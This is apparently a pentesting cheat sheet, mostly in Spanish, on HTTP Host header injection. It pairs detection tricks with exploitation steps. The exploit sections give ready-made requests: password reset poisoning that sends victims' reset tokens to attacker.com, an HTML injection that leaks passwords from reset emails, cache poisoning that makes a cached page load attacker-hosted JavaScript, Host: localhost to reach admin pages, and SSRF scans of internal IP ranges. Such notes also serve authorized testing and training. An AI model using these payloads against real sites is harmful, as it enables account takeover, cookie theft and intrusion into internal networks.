# Host Header

***

## Summary
- [Detection](#detection)
	- [Change Host](#change-host)
	- [X-Forwarded-Host and Referer](#x---forwarded---host-and-referer)
	- [Host with Random Port](#host-with-random-port)
	- [Host with Own Domain](#host-with-own-domain)
	- [Host with Subdomain](#host-with-subdomain)
	- [Host with Duplicated Hosts](#host-with-duplicated-hosts)
	- [Host with Wrapper Line](#host-with-wrapper-line)
	- [Absolute URL](#absolute-url)
- [Exploit](#exploit)
	- [Password Reset Poisoning](#password-resset-poisoning)
		- [Reset with HTML Injection](#reset-with-html-injection)
	- [Web Cache Poisoning](#web-cache-poisoning)
	- [Access to Admin Pages](#access-to-admin-pages)
	- [Internal Web Sites](#internal-web-sites)
	- [SSRF in Host Header](#ssrf-in-host-header)
	- [SSRF in URL Middleware](#ssrf-in-url-middleware)

***

## Detection

En lugar de recibir una respuesta `Invalid Host header`, es posible que su solicitud esté bloqueada como resultado de algún tipo de medida de seguridad. Por ejemplo, algunos sitios web validarán si el encabezado del host coincide con el SNI del protocolo de enlace TLS. Esto no significa necesariamente que sean inmunes a los ataques de encabezado del Host.

**Comprenda cómo analiza el sitio web el encabezado `host`.**

### Change Host

Valor Original:
```
GET / HTTP/1.1
Host: vulnerable.com
```

Valor Modificado:
```
GET / HTTP/1.1
Host: batman.net
```

Es posible que el servidor de aplicaciones para el usuario o el balanceador de carga que recibió su solicitud simplemente no sepa dónde reenviarla, lo que resulta en un error `Invalid Host header`.  Esto es probable si se accede a su objetivo a través de una CDN.

En este caso, debería pasar a probar algunas de las técnicas que se describen a continuación.

### X-Forwarded-Host and Referer

Change real host to `bing.com` and set the header `X-Forwarded-Host`:
```
Host: bing.com
X-Forwarded-Host: vulnerable.com
```

Set header `X-Forwarded-Host: bing.com` and the host with the real host:
```
Host: vulnerable.com
X-Forwarded-Host: bing.com
```

Set header `Referer`:
```
Host: vulnerable.com
Referer: https://www.bing.com/
```

Pruebe además estos headers:
```
Host: vulnerable.com
X-Host: batman
```
```
Host: vulnerable.com
X-Forwarded-Server: batman
```
```
Host: vulnerable.com
X-HTTP-Host-Override: batman
```
```
Host: vulnerable.com
Forwarded: batman
```

*En Burp Suite, puede usar la función `Guess headers` de la extensión **Param Miner** para buscar automáticamente encabezados compatibles utilizando su extensa lista de palabras incorporada.*

### Host with Random Port

Algunos algoritmos de análisis omitirán el puerto del encabezado del `host`, lo que significa que solo se valida el nombre de dominio. Entonces, puede dejar el nombre de dominio intacto para asegurarse de llegar a la aplicación de destino correctamente, mientras  inyecta una carga útil a través del puerto:

```
GET /example HTTP/1.1
Host: vulnerable.com:batman1234
```

### Host with Own Domain

Otros sitios intentarán aplicar la lógica de coincidencia para permitir subdominios arbitrarios. En este caso, es posible que pueda omitir la validación por completo registrando un nombre de dominio arbitrario que termine con la misma secuencia de caracteres que uno de la lista blanca:

```
GET /example HTTP/1.1
Host: nuevodominio-vulnerable.com
```

### Host with Subdomain

Puede aprovechar un subdominio menos seguro que ya ha comprometido:

```
GET /example HTTP/1.1
Host: hacked-subdomain.vulnerable.com
```

### Host with Duplicated Hosts

El código que valida el host y el código que hace algo vulnerable con él a menudo residen en diferentes componentes de la aplicación o incluso en servidores separados. 

Cuando los sistemas no están de acuerdo sobre qué encabezado es el correcto, esto puede generar discrepancias que puede aprovechar:
```
GET /example HTTP/1.1
Host: vulnerable.com
Host: batman
```

Digamos que el front-end da prioridad a la primera instancia del encabezado, pero el back-end prefiere la instancia final. Dado este escenario, puede usar el primer encabezado para asegurarse de que su solicitud se enrute al objetivo previsto y usar el segundo encabezado para pasar su carga útil al código del lado del servidor.


### Host with Wrapper Line

A veces habrá discrepancias entre los diferentes sistemas que procesan su solicitud:
```
GET /example HTTP/1.1
 Host: batman
Host: vulnerable.com
```

El sitio web puede bloquear solicitudes con múltiples encabezados de host, pero es posible que pueda omitir esta validación al agregar la sangría a uno de ellos de esta manera.

Si el `front-end` ignora el header con sangría, la solicitud se procesará como una solicitud normal de `vulnerable.com`. Ahora digamos que el `back-end` ignora el espacio inicial y da prioridad al primer encabezado en el caso de duplicados. Esta discrepancia podría permitirle pasar valores arbitrarios a través del encabezado del primer `Host: batman`".

### Absolute URL

Aunque la request generalmente especifica una ruta relativa en el dominio solicitado como `GET /login`, muchos servidores también están configurados para interpretar las solicitudes de URL absolutas en este path.

La ambigüedad causada por el suministro de una URL absoluta y un encabezado de host también puede dar lugar a discrepancias entre diferentes sistemas. Oficialmente, la línea de solicitud `GET /login` debe tener prioridad al enrutar la solicitud, pero, en la práctica, este no es siempre el caso. Puede aprovechar estas discrepancias de la misma manera que los encabezados de host duplicados.

```
GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here
```

```
CONNECT https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here


```
**Nótese los dos espacio al final de la request.**

Tenga en cuenta que también puede necesitar experimentar con diferentes protocolos. A veces, los servidores se comportan de manera diferente dependiendo de si la línea de solicitud contiene una URL `HTTP` o `HTTPS`.

**Una vez que alguna de estas técnicas se ejecutan en la aplicación víctima, proceda a su potencial explotación.**

***

## Exploit

Una vez que haya identificado que puede pasar nombres de host arbitrarios a la aplicación de destino, puede comenzar a buscar formas de explotarla.

### Password Reset Poisoning

El envenenamiento por restablecimiento de contraseña es una técnica mediante la cual un atacante manipula un sitio web vulnerable para generar un enlace de restablecimiento de contraseña que apunta a un dominio bajo su control. Este comportamiento se puede aprovechar para robar los tokens secretos necesarios para restablecer las contraseñas de usuarios arbitrarios y, en última instancia, comprometer sus cuentas.

Ingrese el usuario o email de la víctima y modifique el header `Host`:

```
POST /forgot-password HTTP/1.1
Host: attacker.com

csrf=cCJ9jLH3SsZvzvEbNYJyMSRUAyegE23i&username=victim01%40gmail.com
```

Luego, un email debería llegar a la bandeja de entrada de la víctima, el cuál contendrá un token único para resetear la contraseña:
```
# email
https://attacker.com/forgot-password?temp-forgot-password-token=DGSsoupk7S9LFWftGFnRMiY4PaItXY5W
```

Cuando dicha víctima clickeé sobre el enlace, se realizará una petición hacia su servidor `attacker.com` con dicho token filtrado.

Utilice este token para restablecer la contraseña del usuario víctima.

**NOTA: `X-Forwarded-Host` también puede probarse en este caso, así como también el resto de los headers que hayan sido aceptados por el aplicativo.**


#### Reset with HTML Injection

Intente la siguiente inyección y verifique si en su correo se ha inyectado los caracteres o números siguientes:
```
POST /forgot-password HTTP/1.1
Host: vulnerable.com:arbitraryport
```
```
POST /forgot-password HTTP/1.1
Host: vulnerable.com:1234
```

Suponiendo que la contraseña se refleja en texto plano dentro del correo recibido, inyecte código HTML para que se envíe hacia su servidor atacante dicha password:
```
POST /forgot-password HTTP/1.1
Host: vulnerable.com:'<a href="//attacker.com/?
```


### Web Cache Poisoning

Con alguna de las técnicas que encontró anteriormente, intente envenenar la memoria caché del aplicativo.

Desde la primera request `GET /` observe el encabezado de respuesta en caché `X-Cache: miss`, envíe la misma solicitud y observe ahora `X-Cache: hit`. Esto le indica que efectivamente hay una memoria cache actuando.

Si ingresa un caché buster notará que rompe de manera esperada la request, devolviendo `X-Cache: miss`:
```
GET /?cgonzalo=bustercache
```

Ahora, con alguna de las técnicas que descubrió anteriormente, intente explotar.

Para este caso, la técnica [Host with Duplicated Hosts](#host-with-duplicated-hosts) funcionó y se explota:
```
GET / HTTP/1.1
Host: vulnerable.com
Host: batman
```

La respuesta muestra la cadena batman reflejada:
```
<script type="text/javascript" src="//batman/resources/js/tracking.js"></script>
```

Elimine el segundo encabezado de `Host` y envíe la solicitud nuevamente usando el mismo destructor de caché. Observe que todavía recibe la misma respuesta en caché que contiene su valor inyectado.
```
GET /?cgonzalo=buster HTTP/1.1
Host: vulnerable.com
```

La respuesta continúa mostrando la cadena batman reflejada:
```
<script type="text/javascript" src="//batman/resources/js/tracking.js"></script>
```

Desde su servidor atacante cree un archivo `/resources/js/tracking.js` que contenga el payload `alert(document.cookie)`.

Agregue un segundo encabezado de host que contenga el nombre de dominio de su servidor atacante:
```
GET /?cgonzalo=buster HTTP/1.1
Host: vulnerable.com
Host: attackerserver.com
```

Envíe la solicitud un par de veces hasta que obtenga un resultado de caché con la URL de su servidor de explotación reflejada en la respuesta. Para simular a la víctima, solicite la página `https://vulnerable/?cgonzalo=buster` en su navegador usando el mismo destructor de caché en la URL y verá el XSS. Luego, envenene el home del aplicativo.

### Access to Admin Pages

Intente acceder a páginas únicamente disponibles desde el servidor local o siendo usuarios administrators:
```
GET /admin
Host: vulnerable.com
```
```
HTTP/1.1 401 Unauthorized
```

Intente:
```
GET /admin
Host: localhost
```
```
HTTP/1.1 200 OK
```

### Internal Web Sites

Las empresas a veces cometen el error de alojar sitios web de acceso público y sitios internos privados en el mismo servidor. Los servidores suelen tener una dirección IP pública y una privada. Como el nombre de host interno puede resolverse en la dirección IP privada, este escenario no siempre se puede detectar simplemente mirando los registros DNS:
```
www.example.com: 12.34.56.78
intranet.example.com: 10.0.0.132
```

En algunos casos, es posible que el sitio interno ni siquiera tenga un registro DNS público asociado. No obstante, un atacante normalmente puede acceder a cualquier host virtual en cualquier servidor al que tenga acceso, siempre que pueda adivinar los nombres de host. 
Si han descubierto un nombre de dominio oculto a través de otros medios, como la divulgación de información , simplemente pueden solicitarlo directamente. De lo contrario, pueden usar herramientas como Burp Intruder para usar hosts virtuales de fuerza bruta usando una lista de palabras simple de subdominios candidatos.


### SSRF in Host Header

Observe siempre el fichero "robots.txt" para paths que sean accesibles sólo localmente.

Si utilizando Collaborator o su servidor atacante recibe una solicitud HTTP:
```
GET /
Host: jf25bf1hyzp8ijxz1lfuovfay14rsg.burpcollaborator.net
```

Intente escanear la red interna para activos internos o endpoints interesantes:
```
GET /
Host: 192.168.0.§0§
```

```
GET /
Host: 192.168.1.§0§
```

### SSRF in URL Middleware 

Si cambia el valor del header `Host` y recibe una respuest `401` o `403`:
```
GET / HTTP/1.1
Host: batman
```
```
HTTP/1.1 403 Forbidden

Client Error: Forbidden
```

Ingrese su misma URL víctima en la llamada del método HTTP y si nota que la respuesta devuelve la web correctamente:
```
GET https://vulnerable.com/ HTTP/1.1
Host: vulnerable.com
```
```
HTTP/1.1 200 OK
```

Cambie el header `Host`. En este caso la respuesta da un `504 Gateway Timeout`, esto sugiere que se está validando la URL absoluta en lugar del encabezado del `Host`.
```
GET https://vulnerable/ HTTP/1.1
Host: batman
```
```
HTTP/1.1 504 Gateway Timeout
```

Use BurpCollaborator para confirmar que puede realizar solicitudes de emisión de middleware del sitio web a un servidor arbitrario:
```
GET https://vulnerable.com/ HTTP/1.1
Host: cgwkjbeq5lblggmya8y2q6t6oxuoid.burpcollaborator.net
```
```
HTTP/1.1 200 OK
Server: Burp Collaborator https://burpcollaborator.net/
X-Collaborator-Version: 4

<html>
	<body>0vjn7jnysxnyag2gmkwvsnzjjgz</body>
</html>
```

Luego, utilice el header del `Host` para escanear el rango de IP `192.168.0.0/24` e identificar la dirección IP de la interfaz de administración, por ejemplo:
```
GET https://vulnerable.com/admin HTTP/1.1
Host: 192.168.0.§0§
```

### SSRF with Incorrect Format

Los proxies personalizados a veces no validan correctamente la línea de solicitud, lo que puede permitirle proporcionar entradas inusuales y mal formadas con resultados desafortunados.

Por ejemplo, un proxy inverso podría tomar la ruta de la línea de solicitud `GET /`, agregarle un prefijo `http://backend-server` y enrutar la solicitud a esa URL en el proceso de envío al backend. 

Esto funciona bien si la ruta comienza con un carácter `/`, pero ¿qué pasa si comienza con un carácter `@`?
```
GET @private-intranet/example HTTP/1.1
```

La URL ascendente resultante será `http://backend-server@private-intranet/example`, que la mayoría de las bibliotecas HTTP interpretan como una solicitud de acceso `private-intranet` con el nombre de usuario `backend-server`.
